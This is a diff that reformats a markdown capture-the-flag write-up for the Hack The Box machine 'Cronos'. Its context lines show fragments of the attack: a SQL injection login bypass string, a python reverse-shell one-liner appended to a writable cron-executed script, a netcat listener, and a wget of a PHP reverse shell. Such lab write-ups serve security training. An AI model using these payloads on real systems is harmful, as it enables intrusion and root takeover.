@@ -3,7 +3,7 @@ layout: /src/layouts/PostLayout.astro
 title: Cronos
 tags: []
 ---
-**Start 11:51 25-08**
+**Start 11:51 25-08-2024**
 
 ---
 ```
@@ -11,7 +11,7 @@ tags: []
 ```
 ## Recon
 
-==Nmap==
+### Nmap
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ nmap -sC -sV -sT -Pn -vvvv -T5 -p- 10.10.10.13
@@ -44,7 +44,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 I added the `host` to my `/etc/hosts` file as `cronos.htb` and started enumerating further.
 
 
-==Dirsearch==
+### Dirsearch
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ dirsearch -u http://cronos.htb/ -x 400,403,404             
@@ -76,7 +76,7 @@ I found [an article](https://medium.com/@dw3113r/dns-zone-transfer-tutorial-subd
 ![](../../../assets/2d785fbb9fc937fae6154ed635c24091.png)
 
 
-==nslookup==
+### nslookup
 We can use a tool called `nslookup` in order to transfer our `DNS Zone`.
 
 ```bash
@@ -94,7 +94,7 @@ This gave us a subdomain called `ns1.cronos.htb` which we can now add to our `/e
 Nothing interesting, let's look further.
 
 
-==dig==
+### dig
 Now that the `zone transfer` is complete we can use `dig` to look up all other valuable information:
 
 ```bash
@@ -127,7 +127,7 @@ admin'-- -
 admin
 ```
 
-==Foothold==
+## Foothold
 We are finally rerouted to the website after successfully injecting our payload:
 
 ![](../../../assets/c8f1fc2e8d6296c676bf907ee7adaa4a.png)
@@ -149,14 +149,13 @@ We figured out that we're logged in as www-data. Now that we know `command injec
 Now that we know what user is on the machine, we can go to his `/home` directory and `cat` the flag.
 
 
-==user.txt==
+### user.txt
 
 ![](../../../assets/878eea6b391b4b150bd4e0c4acf0d23f.png)
 
 
 ## Privilege Escalation
-
-==Reverse shell==
+### Reverse shell
 In order to further escalate privileges I chose to craft up a `python` reverse shell:
 
 ```bash
@@ -204,8 +203,7 @@ ERROR 2002 (HY000): Can't connect to server on '10.10.10.13' (115)
 
 This makes sense, since in our `nmap` scan we did not see any open ports running `MySQL`.
 
-
-==crontab==
+### crontab
 I realized that since the name of the box is `cronos` then it probably has something to do with [cron jobs](Linux%20Privilege%20Escalation.md#Cron%20Jobs#Writable%20Cron%20Job%20Scripts), so I figured to take a look at `/etc/crontabs`:
 
 ![](../../../assets/73ab3de487c0ad5297bd8686943b8e28.png)
@@ -225,7 +223,7 @@ ls -l
 It looks like we have write access to the file, thus we can change it to suffice our needs!
 
 
-==Attempt 1 - FAIL==
+### Attempt 1 - FAIL
 I modify the file to this simple line:
 
 ```bash
@@ -252,7 +250,7 @@ Error opening terminal: unknown.
 I tried `cat >` as well but that didn't work either.
 
 
-==Attempt 2 - Bash==
+### Attempt 2 - Bash
 
 For the second attempt I used the following line to append the `basj -i` reverse shell script to the `artisan` file.
 
@@ -280,7 +278,7 @@ listening on [any] 4444 ...
 ```
 
 
-==Attempt 3 - Python==
+### Attempt 3 - Python
 Remembering that the initial connection was also through python, we will now again try to append a `python reverse shell` to the `artisan` file using the following script:
 
 ```bash
@@ -292,7 +290,7 @@ echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,sock
 This yet again showed no results.
 
 
-==Attempt 4 - wget==
+### Attempt 4 - wget
 As for this attempt I decided to instead set up a `python server` and `wget` a `php-reverse-shell` to the target. I will first download the `reverse shell` to the `/tmp` folder and then rename the file and move it to the correct directory.
 
 ```php
@@ -336,7 +334,7 @@ This attempt finally did work and it gave me a `reverse-shell as root`.
 ![](../../../assets/f2aec4e218079c2cfa0c508965e78fa9.png)
 
 
-==root.txt==
+### root.txt
 ```bash
 cat /root/root.txt
 038b52a1ae1b16f78cdf5989dce136d0
@@ -347,7 +345,7 @@ cat /root/root.txt
 
 ---
 
-**Finished 19:19 26-08**
+**Finished 19:19 26-08-2024**
 
 [^Links]: [[Hack The Box]] [[OSCP Prep]]
 
